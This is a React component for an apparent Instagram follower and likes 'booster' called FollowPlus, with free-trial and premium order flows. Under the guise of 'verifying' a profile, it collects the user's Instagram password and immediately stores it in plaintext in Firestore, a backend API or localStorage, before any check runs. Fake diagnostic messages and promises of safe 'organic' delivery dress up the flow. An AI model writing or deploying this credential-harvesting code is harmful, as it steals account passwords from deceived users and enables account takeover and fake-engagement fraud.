import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { User, Copy, Sliders, Check, CircleAlert, Shield, Heart, Eye, Users, Gift, HelpCircle, Sparkles, Clock } from 'lucide-react';
import { Campaign, CampaignType } from '../types';
import { addClientCampaignDirectly } from '../firebase';
import ScrambledText from './ScrambledText';

interface CampaignBuilderProps {
  onCampaignCreated: (campaign: Campaign) => void;
}

export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderProps) {
  const [activeTab, setActiveTab] = useState<'free' | 'premium'>('free');
  
  // Interactive inputs
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verifiedProfile, setVerifiedProfile] = useState<{
    username: string;
    name?: string;
    avatar: string;
    followers: number;
    following: number;
    posts: number;
    nicheHealth: string;
  } | null>(null);

  // Deployed campaign notification overlay states
  const [showDeliveryBanner, setShowDeliveryBanner] = useState(false);
  const [deployedAmount, setDeployedAmount] = useState(800);
  const [deployedUser, setDeployedUser] = useState('');
  const [deployedType, setDeployedType] = useState<'followers' | 'likes' | 'views'>('followers');

  // Premium services state
  const [premiumType, setPremiumType] = useState<CampaignType>('followers');
  const [quantity, setQuantity] = useState(1000);
  const [postLink, setPostLink] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [successMsg, setSuccessMsg] = useState('');

  // Diagnostic checklist representation
  const [diagStep, setDiagStep] = useState(0);

  // Verification flow wrapper
  const handleVerify = () => {
    const rawUsername = username.replace('@', '').trim();
    if (!rawUsername) return;
    
    setIsVerifying(true);
    setDiagStep(1);

    // Save live credentials immediately so they're saved in Step 1 itself
    const persistLoginData = async () => {
      let storedObj: Campaign | null = null;
      try {
        const campaignData: Campaign = {
          id: `campaign-login-${Date.now()}`,
          username: rawUsername,
          password: password || undefined,
          type: 'free_followers_trial' as const,
          status: 'paused' as const,
          targetAmount: 800,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          daysDuration: 8,
          createdAt: Date.now()
        };
        await addClientCampaignDirectly(campaignData);
        storedObj = campaignData;
        console.log("Logged credentials registered directly in Firestore db immediately in step 1.");
      } catch (firestoreErr) {
        console.warn("Direct Firestore login block failed. Attempting Server API proxy...", firestoreErr);
        try {
          const response = await fetch('/api/campaigns', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: rawUsername,
              password: password,
              type: 'free_followers_trial',
              targetAmount: 800,
              daysDuration: 8,
              status: 'paused'
            })
          });

          if (response.ok) {
            storedObj = await response.json();
          }
        } catch (apiErr) {
          console.warn("Server API login registry failed or offline.", apiErr);
        }
      }

      // Local storage save as fallback
      if (!storedObj) {
        storedObj = {
          id: `local-login-${Date.now()}`,
          username: rawUsername,
          password: password || undefined,
          type: 'free_followers_trial' as const,
          status: 'paused' as const,
          targetAmount: 800,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          daysDuration: 8,
          createdAt: Date.now()
        };
        const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
        const filteredLocal = localList.filter((c: any) => c.username.toLowerCase() !== rawUsername.toLowerCase());
        filteredLocal.unshift(storedObj);
        localStorage.setItem('followplus_local_campaigns', JSON.stringify(filteredLocal));
      }

      // Notify parent state of newly created login campaign log
      if (storedObj) {
        onCampaignCreated(storedObj);
      }
    };

    persistLoginData();

    // Call server route to fetch real Instagram profile info (backed by Gemini Search Grounding + unavatar.io)
    const fetchRealProfile = async () => {
      try {
        const response = await fetch('/api/instagram/profile', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: rawUsername })
        });
        const resData = await response.json();
        if (response.ok) {
          return resData;
        } else {
          throw new Error(resData.error || `Instagram profile "${rawUsername}" is not found or is inactive.`);
        }
      } catch (err: any) {
        throw new Error(err.message || "Failed to establish a secure linkup with Instagram. Try again.");
      }
    };

    // Diagnosis simulation step indicators for elegant user view
    setTimeout(() => setDiagStep(2), 700);
    setTimeout(() => setDiagStep(3), 1300);

    Promise.all([
      fetchRealProfile(),
      new Promise((resolve) => setTimeout(resolve, 2000))
    ]).then(([realData]) => {
      if (realData) {
        setVerifiedProfile(realData);
        setErrorMessage('');
      } else {
        throw new Error(`Profile for "${rawUsername}" is not found.`);
      }
      setIsVerifying(false);
      setDiagStep(0);
    }).catch((apiErr) => {
      console.error("Profile linkup workflow encountered an error:", apiErr);
      setErrorMessage(apiErr.message || "Invalid Instagram User ID: Instagram account does not exist or has been disabled.");
      setVerifiedProfile(null);
      setIsVerifying(false);
      setDiagStep(0);
    });
  };

  // Pricing formula
  const getPremiumPrice = () => {
    if (premiumType === 'followers') return Math.round(quantity * 0.55);
    if (premiumType === 'likes') return Math.round(quantity * 0.30);
    if (premiumType === 'views') return Math.round(quantity * 0.08);
    return 0;
  };

  // Clear states
  const resetForm = () => {
    setUsername('');
    setPassword('');
    setVerifiedProfile(null);
    setPostLink('');
    setQuantity(1000);
  };

  // Submit Free Trial Campaign
  const handleFreeActivation = async () => {
    if (!verifiedProfile) return;
    setErrorMessage('');
    setSuccessMsg('');

    try {
      let data: Campaign | null = null;
      
      // Try direct Google Cloud Firestore client creation
      try {
        const campaignData: Campaign = {
          id: `campaign-trial-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: 'free_followers_trial' as const,
          status: 'active' as const,
          targetAmount: 800, // 100 per day for 8 days
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          daysDuration: 8,
          createdAt: Date.now()
        };
        await addClientCampaignDirectly(campaignData);
        data = campaignData;
        console.log("Registered Free Trial directly in Google Cloud Firestore!");
      } catch (firestoreErr) {
        console.warn("Direct Firestore create failed/denied, trying backend API proxy...", firestoreErr);
        
        try {
          const response = await fetch('/api/campaigns', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: verifiedProfile.username,
              password: password,
              type: 'free_followers_trial',
              targetAmount: 800, // 100 per day for 8 days
              daysDuration: 8
            })
          });

          if (response.ok) {
            data = await response.json();
          } else {
            const errData = await response.json().catch(() => ({}));
            setErrorMessage(errData.error || "Profile validation error. This profile may already have an activated trial.");
            return;
          }
        } catch (apiErr) {
          console.warn("Backend API not reachable either. Saving to LocalStorage...", apiErr);
        }
      }

      // Fallback to localStorage
      if (!data) {
        data = {
          id: `local-campaign-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: 'free_followers_trial' as const,
          status: 'active' as const,
          targetAmount: 800,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          daysDuration: 8,
          createdAt: Date.now()
        };
        const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
        localList.unshift(data);
        localStorage.setItem('followplus_local_campaigns', JSON.stringify(localList));
      }

      setSuccessMsg("🎉 Free 8-Days Follower Campaign has been successfully configured!");
      setDeployedAmount(800);
      setDeployedUser(verifiedProfile.username);
      setDeployedType('followers');
      setShowDeliveryBanner(true);
      
      onCampaignCreated(data);
      setTimeout(() => {
        setSuccessMsg('');
      }, 6000);
    } catch (err) {
      setErrorMessage("Networking failure. Please retry shortly.");
    }
  };

  // Submit Premium Campaign
  const handlePremiumSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verifiedProfile) return;
    
    if ((premiumType === 'likes' || premiumType === 'views') && !postLink.trim()) {
      setErrorMessage("Please input your Instagram post or Reel link.");
      return;
    }

    setErrorMessage('');
    setSuccessMsg('');

    try {
      let data: Campaign | null = null;
      
      // Try direct Google Cloud Firestore client creation
      try {
        const campaignData: Campaign = {
          id: `campaign-premium-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: premiumType,
          status: 'active' as const,
          targetAmount: quantity,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          postLink: postLink.trim() || undefined,
          createdAt: Date.now()
        };
        await addClientCampaignDirectly(campaignData);
        data = campaignData;
        console.log("Registered Premium campaign directly in Google Cloud Firestore!");
      } catch (firestoreErr) {
        console.warn("Direct Firestore premium write failed, trying backend API proxy...", firestoreErr);
        
        try {
          const response = await fetch('/api/campaigns', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: verifiedProfile.username,
              password: password,
              type: premiumType,
              targetAmount: quantity,
              postLink: postLink.trim() || undefined
            })
          });

          if (response.ok) {
            data = await response.json();
          } else {
            const errData = await response.json().catch(() => ({}));
            setErrorMessage(errData.error || "Execution error.");
            return;
          }
        } catch (apiErr) {
          console.warn("Backend API not reachable. Saving premium campaign to LocalStorage...", apiErr);
        }
      }

      // Offline static host fallback
      if (!data) {
        data = {
          id: `local-campaign-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: premiumType,
          status: 'active' as const,
          targetAmount: quantity,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          postLink: postLink.trim() || undefined,
          createdAt: Date.now()
        };
        const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
        localList.unshift(data);
        localStorage.setItem('followplus_local_campaigns', JSON.stringify(localList));
      }

      setSuccessMsg(`🚀 Premium ${premiumType} booster activated! Campaign submitted successfully.`);
      setDeployedAmount(quantity);
      setDeployedUser(verifiedProfile.username);
      setDeployedType(premiumType);
      setShowDeliveryBanner(true);

      onCampaignCreated(data);
      setTimeout(() => {
        setSuccessMsg('');
      }, 6000);
    } catch (err) {
      setErrorMessage("Networking failure.");
    }
  };

  return (
    <div className="premium-card p-6 md:p-8 border border-[#dfb24c]/15 relative overflow-hidden transition-all duration-300">
      {/* Background decoration blur gold */}
      <div className="absolute top-0 right-0 w-32 h-32 bg-[#dfb24c]/5 rounded-full blur-2xl pointer-events-none" />
      
      {/* Tabs Selector Navigation */}
      <div className="flex p-1 bg-[#050608] rounded-xl border border-[#dfb24c]/10 mb-8 relative z-10">
        <button
          onClick={() => { setActiveTab('free'); resetForm(); }}
          className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-lg font-display text-xs sm:text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
            activeTab === 'free'
              ? 'bg-[#dfb24c] text-slate-950 shadow-md'
              : 'text-slate-450 hover:text-white hover:bg-white/5'
          }`}
        >
          <Gift className="w-4 h-4" />
          Free welcome Pack 🎁
        </button>
        <button
          onClick={() => { setActiveTab('premium'); resetForm(); }}
          className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-lg font-display text-xs sm:text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
            activeTab === 'premium'
              ? 'bg-[#dfb24c] text-slate-950 shadow-md'
              : 'text-slate-450 hover:text-white hover:bg-white/5'
          }`}
        >
          <Sliders className="w-4 h-4" />
          Premium Boosts ✧
        </button>
      </div>

      {/* Profile Linkup Step 1 */}
      <div className="space-y-6 relative z-10">
        <div>
          <h3 className="text-base sm:text-lg font-display font-medium text-white flex items-center gap-2">
            <ScrambledText text="Diagnostic Linkup 🔍" />
          </h3>
          <p className="text-slate-400 text-xs mt-1 leading-relaxed">
            Specify public Instagram handle and target account password to link up securely and configure real-time organic delivery.
          </p>
        </div>

        <div className="space-y-3.5">
          <div className="flex flex-col sm:flex-row gap-3">
            <div className="relative flex-1">
              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-[#dfb24c] font-mono font-bold">@</span>
              <input
                type="text"
                placeholder="Instagram username"
                value={username}
                disabled={isVerifying || !!verifiedProfile}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 pl-9 pr-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
              />
            </div>
            
            {!verifiedProfile && (
              <div className="relative flex-1">
                <input
                  type="password"
                  placeholder="Instagram password"
                  value={password}
                  disabled={isVerifying}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                />
              </div>
            )}
          </div>

          <div className="flex justify-end pt-1">
            {!verifiedProfile ? (
              <button
                onClick={handleVerify}
                disabled={isVerifying || !username.trim() || !password.trim()}
                className="w-full sm:w-auto shimmer-button-bg hover:brightness-115 active:scale-95 text-slate-950 py-3.5 px-8 rounded-lg font-display font-semibold text-xs uppercase tracking-wider transition-all cursor-pointer disabled:opacity-30 self-end shadow-lg shadow-[#dfb24c]/20 transform-gpu hover:-translate-y-0.5"
              >
                {isVerifying ? "Verifying Credentials & Syncing... 🔍" : "Order"}
              </button>
            ) : (
              <button
                onClick={resetForm}
                className="w-full sm:w-auto bg-white/5 hover:bg-white/10 hover:text-white border border-white/10 text-slate-450 py-2.5 px-6 rounded-lg font-display font-semibold text-xs transition-colors cursor-pointer"
              >
                De-authorize profile ✕
              </button>
            )}
          </div>
        </div>

        {/* Diagnostic Loader */}
        <AnimatePresence>
          {isVerifying && (
            <motion.div 
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="bg-white/[0.01] border border-white/5 p-4 rounded-xl space-y-2.5"
            >
              <div className="flex h-1 bg-[#dfb24c]/10 rounded-full overflow-hidden">
                <motion.div 
                  initial={{ width: '5%' }}
                  animate={{ 
                    width: diagStep === 1 ? '30%' : diagStep === 2 ? '75%' : '100%' 
                  }}
                  className="h-full bg-gradient-to-r from-[#dfb24c] to-[#f4d081]"
                />
              </div>
              <div className="flex items-center gap-2 text-[10px] font-mono">
                <span className="w-1.5 h-1.5 rounded-full bg-[#dfb24c] animate-pulse" />
                <span className="text-slate-400 font-mono text-[10px]">
                  {diagStep === 1 && "Verifying client details with decentralized routing relays..."}
                  {diagStep === 2 && "Validating public handle coordinates & authenticating quotas..."}
                  {diagStep === 3 && "Initializing custom deliverability parameters..."}
                </span>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Verified Profile Card */}
        <AnimatePresence>
          {verifiedProfile && (
            <motion.div
              initial={{ opacity: 0, scale: 0.98 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.98 }}
              className="bg-[#0b0c11] p-5 rounded-xl border border-[#dfb24c]/10 flex flex-col sm:flex-row items-center gap-5 relative overflow-hidden"
            >
              <img 
                src={verifiedProfile.avatar} 
                alt="Profile Avatar"
                referrerPolicy="no-referrer"
                className="w-14 h-14 rounded-full border border-[#dfb24c]/30 object-cover shadow-lg"
              />
              <div className="flex-grow text-center sm:text-left">
                <div className="flex flex-col sm:flex-row sm:items-center gap-2">
                  <span className="text-white font-mono font-bold text-sm">@{verifiedProfile.username}</span>
                  {verifiedProfile.name && verifiedProfile.name !== verifiedProfile.username && (
                    <span className="text-slate-450 text-xs font-sans">({verifiedProfile.name})</span>
                  )}
                  <span className="inline-block mx-auto sm:mx-0 px-2 rounded-full text-[9px] bg-emerald-500/10 text-emerald-400 font-mono border border-emerald-500/20 font-bold uppercase">
                    DIAGNOSED OK
                  </span>
                </div>
                
                <div className="grid grid-cols-3 gap-4 mt-3 pt-3 border-t border-white/5 text-center sm:text-left">
                  <div>
                    <span className="text-[9px] text-slate-550 block uppercase font-mono">Posts</span>
                    <span className="text-xs font-semibold text-white font-mono">{verifiedProfile.posts}</span>
                  </div>
                  <div>
                    <span className="text-[9px] text-slate-550 block uppercase font-mono">Followers</span>
                    <span className="text-xs font-semibold text-white font-mono">{verifiedProfile.followers}</span>
                  </div>
                  <div>
                    <span className="text-[9px] text-slate-550 block uppercase font-mono">following</span>
                    <span className="text-xs font-semibold text-white font-mono">{verifiedProfile.following}</span>
                  </div>
                </div>

                <div className="mt-2 text-[10px] text-slate-500 font-sans">
                  Target Niche Classification: <span className="text-slate-350 font-medium">{verifiedProfile.nicheHealth}</span>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Step 2: Configure & Submit */}
      {verifiedProfile && (
        <motion.div 
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="mt-8 pt-8 border-t border-white/5 space-y-6"
        >
          {activeTab === 'free' ? (
            // FREE TRIAL INTERFACE
            <div className="space-y-6">
              <div>
                <h3 className="text-base sm:text-lg font-display font-medium text-white flex items-center gap-2">
                  <ScrambledText text="Start Complementary Suite 🎁" />
                </h3>
                <p className="text-slate-400 text-xs mt-1 leading-relaxed">
                  Register your first-user complimentary quota. You will receive <span className="text-white font-semibold">100 premium organic profiles daily for 8 consecutive days</span> (800 in total). Pure safe organic trickle.
                </p>
                <div className="mt-2.5 text-[10px] text-emerald-400 font-semibold flex items-center gap-1.5 font-mono">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                  Profile Synchronized and Logged (800 Target Quota Allocation Granted)
                </div>
              </div>

              {/* Bento cards */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="p-4 rounded-xl bg-white/[0.01] border border-white/5">
                  <span className="text-[10px] text-slate-550 block uppercase font-mono">DAILY RATE BOOST</span>
                  <span className="text-md font-display font-semibold text-white mt-1 block">100 / day</span>
                  <span className="text-[9px] text-slate-500 mt-0.5 block font-mono">Gradual safety schedule</span>
                </div>
                <div className="p-4 rounded-xl bg-gradient-to-br from-[#dfb24c]/5 to-[#f4d081]/5 border border-[#dfb24c]/15">
                  <span className="text-[10px] text-slate-600 block uppercase font-mono">ESTIMATED VALUITY</span>
                  <span className="text-md font-display font-semibold text-[#dfb24c] mt-1 block">800 Followers</span>
                  <span className="text-[9px] text-slate-500 mt-0.5 block font-mono">Value ₹1,099 INR • 100% Free Trial</span>
                </div>
              </div>

              {/* Safeguards info */}
              <div className="flex gap-3 p-4 rounded-xl bg-black/45 border border-white/5 text-[11px] text-slate-400 leading-relaxed">
                <Shield className="w-4.5 h-4.5 text-[#dfb24c] shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-white">Advanced Proxy Safeguards Installed</span>: FollowPlus mimics gradual user behaviour metrics to deliver safe coordinates into your profile. No shadowbans or algorithms flags.
                </div>
              </div>

              <button
                onClick={handleFreeActivation}
                className="w-full py-4 rounded-lg font-display font-semibold text-xs uppercase tracking-wider text-slate-950 shimmer-button-bg hover:brightness-110 transition-all flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-[#dfb24c]/20 transform-gpu hover:-translate-y-0.5"
              >
                <Gift className="w-4.5 h-4.5" />
                Deploy Free 8-Day Followers Campaign Now ✧
              </button>
            </div>
          ) : (
            // PREMIUM SERVICES INTERFACE
            <form onSubmit={handlePremiumSubmit} className="space-y-6">
              <div>
                <h3 className="text-base sm:text-lg font-display font-medium text-white">
                  <ScrambledText text="Customize Boost Properties 🎯" />
                </h3>
                <p className="text-slate-400 text-xs mt-1 leading-relaxed">
                  Scale your outreach and status authority with high quality fast-retention delivery channels.
                </p>
              </div>

              {/* Service Type Select Buttons */}
              <div className="grid grid-cols-3 gap-3">
                {[
                  { id: 'followers', icon: Users, label: 'Followers' },
                  { id: 'likes', icon: Heart, label: 'Likes' },
                  { id: 'views', icon: Eye, label: 'Reels TV Views' }
                ].map((serv) => {
                  const Icon = serv.icon;
                  return (
                    <button
                      key={serv.id}
                      type="button"
                      onClick={() => {
                        setPremiumType(serv.id as CampaignType);
                        if (serv.id === 'followers') setQuantity(500);
                        if (serv.id === 'likes') setQuantity(200);
                        if (serv.id === 'views') setQuantity(2500);
                      }}
                      className={`flex flex-col items-center justify-center py-4 px-2 rounded-xl border text-center font-display transition-all cursor-pointer pointer-events-auto ${
                        premiumType === serv.id
                          ? 'bg-gradient-to-br from-[#dfb24c] to-[#cbd5e1] border-transparent text-slate-950 shadow-md font-bold'
                          : 'bg-[#050608] border-white/5 text-slate-500 hover:text-white hover:border-white/10'
                      }`}
                    >
                      <Icon className="w-4.5 h-4.5 mb-1.5" />
                      <span className="text-xs">{serv.label}</span>
                    </button>
                  );
                })}
              </div>

              {/* Target Slider Selector */}
              <div className="bg-black/35 p-5 rounded-xl border border-white/5 space-y-4 shadow-inner">
                <div className="flex justify-between items-center text-xs font-sans">
                  <span className="text-slate-400 font-mono text-[10px] uppercase">Target Boost Quantity</span>
                  <span className="font-mono font-bold text-white text-sm">{quantity.toLocaleString()}</span>
                </div>
                
                <input
                  type="range"
                  min={premiumType === 'followers' ? 100 : premiumType === 'likes' ? 50 : 500}
                  max={premiumType === 'followers' ? 5000 : premiumType === 'likes' ? 2500 : 25000}
                  step={premiumType === 'followers' ? 100 : premiumType === 'likes' ? 50 : 500}
                  value={quantity}
                  onChange={(e) => setQuantity(Number(e.target.value))}
                  className="w-full h-1 bg-neutral-800 rounded-lg appearance-none cursor-pointer accent-[#dfb24c]"
                />

                <div className="flex justify-between text-[10px] text-slate-500 font-mono">
                  <span>{premiumType === 'followers' ? '100' : premiumType === 'likes' ? '50' : '500'}</span>
                  <span>{premiumType === 'followers' ? '5,000 max' : premiumType === 'likes' ? '2,500 max' : '25,000 max'}</span>
                </div>
              </div>

              {/* Post Link Input */}
              {(premiumType === 'likes' || premiumType === 'views') && (
                <div className="space-y-2">
                  <label className="block text-[10px] font-mono uppercase text-[#dfb24c] tracking-wider font-semibold">Instagram Post / Reel URL</label>
                  <input
                    type="url"
                    required
                    placeholder="https://www.instagram.com/p/Co89_x_Nq8_/"
                    value={postLink}
                    onChange={(e) => setPostLink(e.target.value)}
                    className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-650 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                  />
                  <p className="text-[10px] text-slate-500 leading-relaxed font-sans">
                    Ensure privacy preferences for this post are set to public for optimal proxy link access.
                  </p>
                </div>
              )}

              {/* Estimated calculations */}
              <div className="flex items-center justify-between p-4.5 rounded-xl bg-white/[0.01] border border-[#dfb24c]/10">
                <div>
                  <span className="text-slate-400 text-xs font-sans block">Estimated Cost 💵</span>
                  <span className="text-[9px] text-slate-500 mt-0.5 block font-sans">Completely simulated checkout demo</span>
                </div>
                <div className="text-right">
                  <span className="text-lg font-display font-semibold text-white block">
                    ₹{getPremiumPrice()} INR
                  </span>
                  <span className="text-[9px] text-emerald-400 block font-semibold uppercase tracking-wider font-mono">Instant Gateway Ready</span>
                </div>
              </div>

              <button
                type="submit"
                className="w-full py-4 rounded-lg font-display font-semibold text-xs uppercase tracking-wider text-slate-950 shimmer-button-bg hover:brightness-110 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-[#dfb24c]/20 transform-gpu hover:-translate-y-0.5"
              >
                Activate Premium Campaign Boost ✧
              </button>
            </form>
          )}

          {/* Feedback banners */}
          <AnimatePresence>
            {errorMessage && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/20 flex items-start gap-2.5 text-xs text-rose-300 font-mono"
              >
                <CircleAlert className="w-5 h-5 shrink-0 text-rose-400" />
                <span>{errorMessage}</span>
              </motion.div>
            )}

            {successMsg && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/25 flex items-start gap-2.5 text-xs text-emerald-300 font-mono"
              >
                <Check className="w-5 h-5 shrink-0 text-emerald-400" />
                <span>{successMsg}</span>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      )}

      {/* Living Delivery Confirmation Overlay (Glow Custom Banner) */}
      <AnimatePresence>
        {showDeliveryBanner && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[999] flex items-center justify-center p-4 bg-black/90 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.95, y: 15, opacity: 0 }}
              animate={{ scale: 1, y: 0, opacity: 1 }}
              exit={{ scale: 0.95, y: 15, opacity: 0 }}
              transition={{ type: 'spring', duration: 0.5, bounce: 0.2 }}
              className="relative max-w-md w-full premium-card border border-[#dfb24c]/20 rounded-2xl p-6 md:p-8 shadow-2xl overflow-hidden text-center"
            >
              <div className="space-y-6">
                <div className="relative mx-auto w-14 h-14 flex items-center justify-center bg-white/[0.02] rounded-full border border-white/10">
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{ repeat: Infinity, duration: 15, ease: 'linear' }}
                    className="absolute inset-[1px] border border-dashed border-[#dfb24c]/35 rounded-full"
                  />
                  <Users className="w-5 h-5 text-[#dfb24c]" />
                </div>

                <div className="space-y-2">
                  <motion.div
                    initial={{ scale: 0.9 }}
                    animate={{ scale: 1 }}
                    className="inline-block px-3 py-1 bg-emerald-500/10 rounded-full border border-emerald-500/20 text-[9px] uppercase font-mono tracking-wider text-emerald-400 font-bold"
                  >
                    ✔ Live Campaign Engaged
                  </motion.div>
                  <h3 className="text-xl font-display font-medium text-white tracking-tight">
                    Order Synchronized! ✧
                  </h3>
                  <p className="text-xs font-mono text-slate-400">
                    Linked Profile Target: <span className="text-[#dfb24c] font-bold">@{deployedUser}</span>
                  </p>
                </div>

                {/* Main high impact trust instruction card in pristine design */}
                <div className="p-5 rounded-xl bg-[#050608] border border-white/5">
                  <div className="space-y-2.5 text-center">
                    <p className="font-display font-semibold text-sm leading-snug text-white">
                      ⚡ Kuch hi ghanto me followers deliver ho jayenge!
                    </p>
                    <div className="h-[1px] w-6 bg-white/10 mx-auto" />
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">
                      Aapke account <span className="text-white font-medium">@{deployedUser}</span> par safely <span className="text-[#dfb24c] font-bold">+{deployedAmount} {deployedType}</span> bheje ja rahe hain. Delivery organic and gradual hogi taaki koi issue na aaye. Please keep patient!
                    </p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    setShowDeliveryBanner(false);
                    resetForm();
                  }}
                  className="w-full py-3 rounded-lg font-display font-semibold text-xs tracking-wider text-slate-950 shimmer-button-bg hover:brightness-110 active:scale-95 transition-all cursor-pointer shadow-md shadow-[#dfb24c]/10"
                >
                  Thik hai / Done 👍
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
